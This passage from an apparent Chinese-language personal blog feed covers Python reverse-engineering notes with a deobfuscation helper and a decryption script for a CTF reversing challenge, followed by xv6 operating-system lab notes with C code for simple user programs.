class="line">    sum_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?:int\(\d+\)(?:\s*\+\s*int\(\d+\))+)&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sum_repl</span>(<span class="params">m</span>):</span><br><span class="line">        nums = re.findall(<span class="string">r&#x27;int\((\d+)\)&#x27;</span>, m.group(<span class="number">0</span>))</span><br><span class="line">        total = <span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, nums))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(total)</span><br><span class="line">    text = sum_pattern.sub(sum_repl, text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再将单独的 int(123) -&gt; 123 （但不改 int()）</span></span><br><span class="line">    text = re.sub(<span class="string">r&#x27;\bint\((\d+)\)\b&#x27;</span>, <span class="string">r&#x27;\1&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_statements_to_lines</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将以分号分隔的语句拆成多行，保留 ; 如果它在字符串常量内部则比较复杂——</span></span><br><span class="line"><span class="string">    这里采取保守方法：基于简单分割 `;`，并修复连续 ; 带来的空行。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先把 Windows/Mac 换行标准化</span></span><br><span class="line">    text = text.replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试智能拆分：把每个顶级分号作为换行位置</span></span><br><span class="line">    <span class="comment"># 这里用简单分割（对大多数混淆脚本是足够的，因为代码里少用字符串包含分号）</span></span><br><span class="line">    parts = [p.strip() <span class="keyword">for</span> p <span class="keyword">in</span> text.split(<span class="string">&#x27;;&#x27;</span>)]</span><br><span class="line">    <span class="comment"># 移除完全空的段</span></span><br><span class="line">    parts = [p <span class="keyword">for</span> p <span class="keyword">in</span> parts <span class="keyword">if</span> p != <span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    <span class="comment"># 每行以分号结尾（保持语句终止），最后一行如果本来没有分号就不加</span></span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(parts):</span><br><span class="line">        <span class="comment"># 如果末尾是注释（# ...），已经在 p 中；我们保留注释</span></span><br><span class="line">        <span class="comment"># 对于最后一段：如果原文以分号结尾我们也会保留分号；这里检测比较难，保持每行加分号可以不影响执行</span></span><br><span class="line">        <span class="comment"># 但为了更自然，我们不在最后一行添加分号</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(parts) - <span class="number">1</span>:</span><br><span class="line">            lines.append(p + <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lines.append(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prettify</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主流程：先做数值简化，再拆行；这样可保证像 int(1)+int(2) 这种被合并后再换行。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = optimize_int_sums(text)</span><br><span class="line">    t = split_statements_to_lines(t)</span><br><span class="line">    <span class="comment"># 额外的清理：去掉多余空行</span></span><br><span class="line">    t = re.sub(<span class="string">r&#x27;\n\s*\n+&#x27;</span>, <span class="string">&#x27;\n\n&#x27;</span>, t)</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">path: Path</span>):</span><br><span class="line">    bak = path.with_suffix(path.suffix + <span class="string">&#x27;.bak&#x27;</span>)</span><br><span class="line">    shutil.copy2(path, bak)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Backup created: <span class="subst">&#123;bak&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">in_path: Path, out_path: Path = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> in_path.exists():</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(in_path)</span><br><span class="line">    <span class="keyword">if</span> out_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        out_path = in_path.with_name(in_path.stem + <span class="string">&#x27;_optimized&#x27;</span> + in_path.suffix)</span><br><span class="line"></span><br><span class="line">    backup_file(in_path)</span><br><span class="line">    text = in_path.read_text(encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    new_text = prettify(text)</span><br><span class="line">    out_path.write_text(new_text, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Optimized written to: <span class="subst">&#123;out_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python optimize_and_prettify.py &lt;input_file.py&gt; [&lt;output_file.py&gt;]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    inp = Path(sys.argv[<span class="number">1</span>])</span><br><span class="line">    out = Path(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process_file(inp, out)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/image-20251027111318593.png" alt="image-20251027111318593"></p><p>运行会报错</p><p>然后跟着wp</p><p><img src="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/image-20251027112042227.png" alt="image-20251027112042227"></p><p>ai分析机器码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数（已知）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(b * <span class="number">40</span> + (b ^ key)) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数：枚举明文字节 0-255，找满足加密后等于密文字节的 p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_byte</span>(<span class="params">c, key</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (p * <span class="number">40</span> + (p ^ key)) &amp; <span class="number">0xFF</span> == c:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        p = decrypt_byte(c, key)</span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        res.append(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目给出的 base64（可能是正确密文）</span></span><br><span class="line">b64_str = <span class="string">&quot;425MvHMxtLqZ3ty3RZkw3mwwulNRjkswbpkDMK+3CDCOtbe6kzAqPyrcEAI=&quot;</span></span><br><span class="line">cipher = base64.b64decode(b64_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有 key 解密</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    plain = decrypt(cipher, key)</span><br><span class="line">    <span class="keyword">if</span> plain <span class="keyword">and</span> plain.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>) <span class="keyword">and</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= x &lt; <span class="number">127</span> <span class="keyword">for</span> x <span class="keyword">in</span> plain):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key: <span class="subst">&#123;key:02x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;plain.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No valid flag found for any key.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="各种版本的python环境"><a href="#各种版本的python环境" class="headerlink" title="各种版本的python环境"></a>各种版本的python环境</h2><p>conda</p><p><img src="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/image-20251027114148015.png" alt="image-20251027114148015"></p><p>venv</p><p>创建：python3.13 -m venv venv313</p><p>激活：Windows:venv313\Scripts\activate   Linux:source venv313&#x2F;bin&#x2F;activate</p><p>退出：deactivate</p><p>验证版本：python -V</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025羊城杯复现</title>
      <link href="/2025/10/15/2025%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/10/15/2025%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统设计实践</title>
      <link href="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/"/>
      <url>/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>2018年以前的是x86平台，2019年开始改为risc-v平台。<br><a href="https://pdos.csail.mit.edu/6.828/2025/xv6.html">https://pdos.csail.mit.edu/6.828/2025/xv6.html</a></p><p><a href="https://lihaoran.work/wp-content/uploads/2023/08/xv6-chinese.pdf">xv6 中文文档</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>ubuntu24.04虚拟机</p><p><code>sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</code></p><h1 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h1><h3 id="1-kernel-目录-内核核心代码"><a href="#1-kernel-目录-内核核心代码" class="headerlink" title="1. kernel&#x2F; 目录 - 内核核心代码"></a>1. kernel&#x2F; 目录 - 内核核心代码</h3><p>这是xv6操作系统的内核部分，包含所有核心功能：</p><p>进程管理：</p><ul><li><p>proc.c, proc.h - 进程控制块(PCB)和进程管理</p></li><li><p>exec.c - 程序执行和加载</p></li><li><p>swtch.S - 进程上下文切换的汇编代码</p></li></ul><p>内存管理：</p><ul><li><p>kalloc.c - 内核内存分配器</p></li><li><p>vm.c, vm.h - 虚拟内存管理</p></li><li><p>memlayout.h - 内存布局定义</p></li></ul><p>文件系统：</p><ul><li><p>file.c, file.h - 文件操作接口</p></li><li><p>fs.c, fs.h - 文件系统实现</p></li><li><p>log.c - 文件系统日志和崩溃恢复</p></li><li><p>bio.c, buf.h - 块设备I&#x2F;O和缓冲区管理</p></li></ul><p>系统调用：</p><ul><li><p>syscall.c, syscall.h - 系统调用分发器</p></li><li><p>sysfile.c - 文件相关系统调用实现</p></li><li><p>sysproc.c - 进程相关系统调用实现</p></li></ul><p>硬件抽象层：</p><ul><li><p>trap.c - 中断和异常处理</p></li><li><p>uart.c - 串口通信</p></li><li><p>virtio_disk.c, virtio.h - 磁盘I&#x2F;O</p></li><li><p>plic.c - 平台级中断控制器</p></li></ul><p>同步机制：</p><ul><li><p>spinlock.c, spinlock.h - 自旋锁实现</p></li><li><p>sleeplock.c, sleeplock.h - 睡眠锁实现</p></li></ul><p>其他核心组件：</p><ul><li><p>main.c - 内核启动入口</p></li><li><p>entry.S - 内核入口汇编代码</p></li><li><p>start.c - 系统启动初始化</p></li><li><p>console.c - 控制台I&#x2F;O</p></li><li><p>printf.c - 格式化输出</p></li><li><p>string.c - 字符串操作函数</p></li></ul><h3 id="2-user-目录-用户空间程序"><a href="#2-user-目录-用户空间程序" class="headerlink" title="2. user&#x2F; 目录 - 用户空间程序"></a>2. user&#x2F; 目录 - 用户空间程序</h3><p>包含所有用户态程序和工具：</p><p>系统工具：</p><ul><li><p>cat.c - 文件内容显示</p></li><li><p>echo.c - 回显命令</p></li><li><p>grep.c - 文本搜索</p></li><li><p>ls.c - 目录列表</p></li><li><p>mkdir.c - 创建目录</p></li><li><p>rm.c - 删除文件</p></li><li><p>ln.c - 创建链接</p></li><li><p>wc.c - 字符&#x2F;词&#x2F;行计数</p></li><li><p>sleep.c - 休眠命令</p></li><li><p>kill.c - 终止进程</p></li></ul><p>Shell和系统：</p><ul><li><p>sh.c - Shell解释器</p></li><li><p>init.c - 系统初始化进程</p></li><li><p>memdump.c - 内存转储工具</p></li></ul><p>测试程序：</p><ul><li><p>usertests.c - 用户态测试套件</p></li><li><p>forktest.c - 进程创建测试</p></li><li><p>grind.c - 压力测试</p></li><li><p>stressfs.c - 文件系统压力测试</p></li><li><p>logstress.c - 日志压力测试</p></li></ul><p>库函数：</p><ul><li><p>ulib.c - 用户态库函数</p></li><li><p>umalloc.c - 用户态内存分配</p></li><li><p>printf.c - 用户态格式化输出</p></li><li><p>user.h - 用户态头文件定义</p></li></ul><p>系统调用接口：</p><ul><li><p>usys.pl - 生成系统调用汇编代码的Perl脚本</p></li><li><p>user.ld - 用户程序链接脚本</p></li></ul><h3 id="3-mkfs-目录-文件系统工具"><a href="#3-mkfs-目录-文件系统工具" class="headerlink" title="3. mkfs&#x2F; 目录 - 文件系统工具"></a>3. mkfs&#x2F; 目录 - 文件系统工具</h3><ul><li>mkfs.c - 创建xv6文件系统镜像的工具</li></ul><h3 id="4-conf-目录-配置文件"><a href="#4-conf-目录-配置文件" class="headerlink" title="4. conf&#x2F; 目录 - 配置文件"></a>4. conf&#x2F; 目录 - 配置文件</h3><ul><li>lab.mk - 实验配置的Makefile片段</li></ul><h3 id="5-根目录文件"><a href="#5-根目录文件" class="headerlink" title="5. 根目录文件"></a>5. 根目录文件</h3><ul><li><p>Makefile - 主构建文件</p></li><li><p>README - 项目说明文档</p></li><li><p>LICENSE - 许可证文件</p></li><li><p>test-xv6.py - 自动化测试脚本</p></li><li><p>grade-lab-util - 实验评分脚本</p></li><li><p>gradelib.py - 评分库</p></li></ul><h1 id="Lab1-Unix-utilities"><a href="#Lab1-Unix-utilities" class="headerlink" title="Lab1:Unix utilities"></a>Lab1:Unix utilities</h1><h2 id="1-添加sleep系统调用"><a href="#1-添加sleep系统调用" class="headerlink" title="1.添加sleep系统调用"></a>1.添加sleep系统调用</h2><ul><li>kernel&#x2F;syscall.h：新增系统调用号，添加 #define SYS_sleep <n>（选择未占用的编号，保持与现有顺序一致）</n></li><li>kernel&#x2F;syscall.c：注册分发入口，声明 extern uint64 sys_sleep(void);，在 static uint64 (*syscalls[])(void) 表中加入 [SYS_sleep] &#x3D; sys_sleep（修改：把SYS_sleep映射到sys_pause)</li><li>kernel&#x2F;sysproc.c：实现内核侧处理函数，实现 uint64 sys_sleep(void)：，用 argint(0, &amp;n) 取参数，读取并比较 ticks，在 tickslock 下调用 sleep(&amp;ticks, &amp;tickslock) 等待，处理中途被 killed 的情况，返回 -1 或 0，提醒：sleep(void *chan, struct spinlock *lk) 在 kernel&#x2F;proc.c 已实现，可直接复用</li><li>user&#x2F;user.h：声明用户态原型，添加 int sleep(int);</li><li>user&#x2F;usys.pl：生成用户态封装（a0 放参数，a7 放号，执行 ecall）</li><li>user&#x2F;usys.S：手动新增 sleep 的封装（通常不需要，make 会由 usys.pl 自动生成），（无需修改）陷阱&#x2F;返回路径</li><li>kernel&#x2F;trap.c、kernel&#x2F;trampoline.S 无需改动，sleep 走标准系统调用路径即可</li></ul><h2 id="2-添加sixfive命令"><a href="#2-添加sixfive命令" class="headerlink" title="2.添加sixfive命令"></a>2.添加sixfive命令</h2><p>在user&#x2F;sixfive.c写sixfive函数，修改Makefile,添加到 <code>UPROGS</code> </p><p>思路：</p><p>打开指定的文件。</p><p>从文件中逐字符读取，提取数字（支持负数）。</p><p>用 <code>- \r \t \n . / ,</code> 作为数字分隔符。</p><p>对于提取到的每个数字，计算其绝对值。</p><p>如果能被 5 或 6 整除，就输出这个绝对值（每行一个）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* seqs=<span class="string">&quot;-\r\t\n./,&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_seq</span><span class="params">(<span class="type">char</span> c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strchr</span>(seqs,c)!=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">process_fd</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">int</span> in_num=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> negative=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(read(fd,&amp;c,<span class="number">1</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_num)&#123;</span><br><span class="line">                in_num=<span class="number">1</span>;</span><br><span class="line">                negative=<span class="number">0</span>;</span><br><span class="line">                num=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num=num*<span class="number">10</span>+(c-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(is_seq(c))&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_num)&#123;</span><br><span class="line">                <span class="type">long</span> val=negative?-num:num;</span><br><span class="line">                <span class="type">long</span> absval=val&lt;<span class="number">0</span>?-val:val;</span><br><span class="line">                <span class="keyword">if</span>(absval%<span class="number">5</span>==<span class="number">0</span>||absval%<span class="number">6</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>,absval);</span><br><span class="line">                &#125;</span><br><span class="line">                in_num=<span class="number">0</span>;</span><br><span class="line">                num=<span class="number">0</span>;</span><br><span class="line">                negative=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                in_num=<span class="number">1</span>;</span><br><span class="line">                negative=<span class="number">1</span>;</span><br><span class="line">                num=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(in_num)&#123;</span><br><span class="line">                <span class="type">long</span> val=negative?-num:num;</span><br><span class="line">                <span class="type">long</span> absval=val&lt;<span class="number">0</span>?-val:val;</span><br><span class="line">                <span class="keyword">if</span>(absval%<span class="number">5</span>==<span class="number">0</span>||absval%<span class="number">6</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>,absval);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(in_num)&#123;</span><br><span class="line">        <span class="type">long</span> val=negative?-num:num;</span><br><span class="line">        <span class="type">long</span> absval=val&lt;<span class="number">0</span>?-val:val;</span><br><span class="line">        <span class="keyword">if</span>(absval%<span class="number">5</span>==<span class="number">0</span>||absval%<span class="number">6</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>,absval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;Usage: sixfive file...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="type">int</span> fd = open(argv[i], <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;sixfive: cannot open %s\n&quot;</span>, argv[i]);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        process_fd(fd);</span><br><span class="line">        close(fd);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-memdump"><a href="#3-memdump" class="headerlink" title="3.memdump"></a>3.memdump</h2><p>在user&#x2F;memdump.c写memedump函数，修改Makefile添加到 <code>UPROGS</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">memdump</span><span class="params">(<span class="type">char</span> *fmt, <span class="type">char</span> *data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span 